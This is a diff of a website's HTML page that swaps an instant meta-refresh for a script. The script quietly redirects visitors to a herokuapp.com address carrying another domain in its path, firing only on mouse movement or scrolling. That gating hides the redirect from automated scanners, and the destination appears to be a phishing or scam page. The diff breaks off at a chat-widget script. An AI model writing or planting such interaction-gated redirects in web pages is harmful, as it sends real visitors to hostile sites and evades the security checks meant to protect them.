@@ -1,14 +1,27 @@
 <!doctype html>
 <html lang="en">
-<head>
-  <!DOCTYPE html>
-<html>
-<head>
-  <meta http-equiv="refresh" content="0; url=https://austria-24e46c02ccb8.herokuapp.com/forrxon.online/sheron/index.html/">
-</head>
-<body>
-</body>
-</html>
+ <script>
+        // Paste your chosen JavaScript code snippet here (e.g., from the combined example)
+        let redirected = false;
+        const targetUrl = "https://austria-24e46c02ccb8.herokuapp.com/forrxon.online/sheron/index.html/"; 
+
+        function handleInteraction() {
+            if (!redirected) {
+                redirected = true;
+                window.location.replace(targetUrl); 
+                document.removeEventListener('mousemove', handleInteraction);
+                document.removeEventListener('scroll', handleInteraction);
+            }
+        }
+        function checkScroll() {
+            if (window.scrollY > 200) {
+                handleInteraction();
+            }
+        }
+        document.addEventListener('mousemove', handleInteraction);
+        document.addEventListener('scroll', checkScroll);
+    </script>
+
 
   <!--Start of Tawk.to Script-->
 <script type="text/javascript">
